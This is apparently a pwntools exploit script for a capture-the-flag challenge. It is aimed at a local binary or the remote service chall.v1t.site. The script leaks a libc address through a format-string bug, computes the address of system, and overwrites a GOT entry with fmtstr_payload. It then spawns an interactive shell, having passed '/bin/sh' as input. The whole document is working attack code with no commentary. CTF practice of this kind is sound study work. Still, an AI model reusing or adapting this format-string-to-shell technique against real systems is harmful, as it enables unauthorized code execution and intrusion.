from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./chall"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("chall.v1t.site", 30213)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

payload = b"/bin/sh"
io.sendlineafter("name?\n", payload)

payload = b"--%27$p--"
ddebug("break *0x04012BF\n continue")
io.sendlineafter("want\n", payload)

io.recvuntil("--", drop=True)
leak = int(io.recv(14), 16)
libc.address = leak - 0x2a1ca
log.success("libc.address :-----> " + hex(libc.address))

system_add = libc.symbols["system"]
log.success("system :-----> " + hex(system_add))

payload = fmtstr_payload(8, {0x404000: system_add}, write_size="byte")
io.sendlineafter("LOUD!\n", payload)

io.interactive()
